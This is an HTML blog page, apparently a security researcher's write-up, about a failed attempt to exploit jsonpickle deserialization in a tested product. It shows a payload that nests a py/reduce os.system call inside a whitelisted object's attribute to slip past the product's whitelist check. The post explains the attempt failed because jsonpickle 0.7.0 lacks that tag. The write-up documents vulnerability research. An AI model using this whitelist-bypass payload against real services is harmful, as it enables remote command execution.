@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Rhein">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="一次失败的jsonpickle反序列化漏洞利用"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="Rhein&#39;s Blog"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://sugarp1g.github.io"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Rhein&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Rhein's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+  <!-- Custom CSS -->
+  
+  
+<link rel="stylesheet" href="/css/style.light.css">
+
+
+  <!-- Google Analytics -->
+  
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">一次失败的jsonpickle反序列化漏洞利用</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a target="_blank" rel="noopener" href="https://github.com/SugarP1g">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:zhuchenhui1990@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Rhein</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2022-01-18</span>
+            <span class="time">15:58:20</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a> <a class="tag" href="/tags/Python/">#Python</a> <a class="tag" href="/tags/pickle/">#pickle</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>一次失败的jsonpickle反序列化漏洞利用，记录一下。</p>
+<span id="more"></span>
+
+<h1 id="0x00-产品的白名单校验逻辑"><a href="#0x00-产品的白名单校验逻辑" class="headerlink" title="0x00 产品的白名单校验逻辑"></a>0x00 产品的白名单校验逻辑</h1><p>最近测试一个产品，发现产品在解析http请求中的message时，使用了jsonpickle库。大致的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_decode</span>(<span class="params">string</span>):</span></span><br><span class="line">    json_validate(string)</span><br><span class="line">    <span class="keyword">return</span> jsonpickle.decode(string)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">JSON_PICKLE_WHITE_LIST = [</span><br><span class="line">    <span class="string">&quot;xx.yy.A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xx.yy.B&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_validate</span>(<span class="params">raw_string</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;jsonpickle.decode数据做白名单校验&quot;&quot;&quot;</span></span><br><span class="line">    raw_data = json.loads(raw_string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_data:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(raw_data, <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> raw_data:</span><br><span class="line">            class_name = item.get(<span class="string">&quot;py/object&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> class_name <span class="keyword">not</span> <span class="keyword">in</span> JSON_PICKLE_WHITE_LIST:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;%s is invalid for jsonpickle&quot;</span> % class_name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(raw_data, <span class="built_in">dict</span>):</span><br><span class="line">        class_name = raw_data.get(<span class="string">&quot;py/object&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> class_name <span class="keyword">not</span> <span class="keyword">in</span> JSON_PICKLE_WHITE_LIST:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;%s is invalid for jsonpickle&quot;</span> % class_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;%s is invalid type for jsonpickle&quot;</span> % <span class="built_in">type</span>(raw_data))</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在使用jsonpickle解析前，有一个白名单校验逻辑，校验需要创建的对象是否在白名单内。</p>
+<p>第一眼看到，就觉得有问题。校验时识别到”py/object”这个tag，会校验值是否为白名单里的类。如果触发反序列化漏洞的点为白名单类的一个属性呢？好像就可以直接绕过白名单校验逻辑。</p>
+<h1 id="0x01-本地尝试绕过"><a href="#0x01-本地尝试绕过" class="headerlink" title="0x01 本地尝试绕过"></a>0x01 本地尝试绕过</h1><p>首先在本地尝试绕过，将产品的json解析代码在本地实现了。</p>
+<ul>
+<li>Step 1：构造Exp类</li>
+</ul>
+<p>跟pickle反序列化的利用思路一样，利用的是__reduce__这个魔法函数，Exp类如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&quot;calc&quot;</span>,)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 2：然后创建白名单类（A）的对象，并将Exp对象赋值给A的成员变量d：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = A(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">a.d = Exp()</span><br><span class="line"><span class="built_in">print</span>(jsonpickle.encode(a))</span><br></pre></td></tr></table></figure>
+
+<p>编码后结果如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;py/object&quot;</span>: <span class="string">&quot;xx.yy.A&quot;</span>, <span class="attr">&quot;u&quot;</span>: <span class="literal">null</span>, <span class="attr">&quot;l&quot;</span>: &#123;&#125;, <span class="attr">&quot;d&quot;</span>: &#123;<span class="attr">&quot;py/reduce&quot;</span>: [&#123;<span class="attr">&quot;py/function&quot;</span>: <span class="string">&quot;nt.system&quot;</span>&#125;, &#123;<span class="attr">&quot;py/tuple&quot;</span>: [<span class="string">&quot;calc&quot;</span>]&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 3：使用该Poc进行解析操作</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&#x27;&#123;&quot;py/object&quot;: &quot;xx.yy.A&quot;, &quot;u&quot;: null, &quot;l&quot;: &#123;&#125;, &quot;d&quot;: &#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;nt.system&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;calc&quot;]&#125;]&#125;&#125;&#x27;</span></span><br><span class="line">json_decode(poc)</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<h1 id="0x02-现网利用"><a href="#0x02-现网利用" class="headerlink" title="0x02 现网利用"></a>0x02 现网利用</h1><p>于是拿着修改后的payload兴冲冲地去现网进行验证，发现在现网尝试利用后毫无反应。WTF！</p>
+<p>对产品的代码进行了进一步调试，终于发现了原因。原来产品用的是jsonpickle老版本0.7.0。在这个版本里，还没有支持”py/reduce”这个tag，导致无法触发函数的执行。</p>
+<p>在0.7.0这个版本里，仅支持以下的tag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jsonpickle 0.7.0</span></span><br><span class="line"><span class="comment"># file path: tags.py</span></span><br><span class="line"><span class="keyword">from</span> jsonpickle.compat <span class="keyword">import</span> <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">ID = <span class="string">&#x27;py/id&#x27;</span></span><br><span class="line">OBJECT = <span class="string">&#x27;py/object&#x27;</span></span><br><span class="line">TYPE = <span class="string">&#x27;py/type&#x27;</span></span><br><span class="line">REPR = <span class="string">&#x27;py/repr&#x27;</span></span><br><span class="line">REF = <span class="string">&#x27;py/ref&#x27;</span></span><br><span class="line">TUPLE = <span class="string">&#x27;py/tuple&#x27;</span></span><br><span class="line">SET = <span class="string">&#x27;py/set&#x27;</span></span><br><span class="line">SEQ = <span class="string">&#x27;py/seq&#x27;</span></span><br><span class="line">STATE = <span class="string">&#x27;py/state&#x27;</span></span><br><span class="line">JSON_KEY = <span class="string">&#x27;json://&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All reserved tag names</span></span><br><span class="line">RESERVED = <span class="built_in">set</span>([OBJECT, TYPE, REPR, REF, TUPLE, SET, SEQ, STATE])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jsonpickle 0.7.0</span></span><br><span class="line"><span class="comment"># file path: unpickler.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unpickler</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_restore</span>(<span class="params">self, obj</span>):</span></span><br><span class="line">        <span class="keyword">if</span> has_tag(obj, tags.ID):</span><br><span class="line">            restore = self._restore_id</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.REF): <span class="comment"># Backwards compatibility</span></span><br><span class="line">            restore = self._restore_ref</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.TYPE):</span><br><span class="line">            restore = self._restore_type</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.REPR): <span class="comment"># Backwards compatibility</span></span><br><span class="line">            restore = self._restore_repr</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.OBJECT):</span><br><span class="line">            restore = self._restore_object</span><br><span class="line">        <span class="keyword">elif</span> util.is_list(obj):</span><br><span class="line">            restore = self._restore_list</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.TUPLE):</span><br><span class="line">            restore = self._restore_tuple</span><br><span class="line">        <span class="keyword">elif</span> has_tag(obj, tags.SET):</span><br><span class="line">            restore = self._restore_set</span><br><span class="line">        <span class="keyword">elif</span> util.is_dictionary(obj):</span><br><span class="line">            restore = self._restore_dict</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            restore = <span class="keyword">lambda</span> x: x</span><br><span class="line">        <span class="keyword">return</span> restore(obj)</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h1><p>搞了一个下午，白白兴奋了一下。第一次发现开源软件不升级版本，有的时候竟然还是一件好事情。。。</p>
+<p>从代码来看，当前可以通过”py/object”去创建一个对象，可以通过”py/type”去加载一个模块。后续看看产品对反序列化结果是如何使用的，因为对象的属性是可以控制的，如果使用不当（例如拼接到命令里），还是可以进一步利用的。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+
+<script src="/js/highlight.pack.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
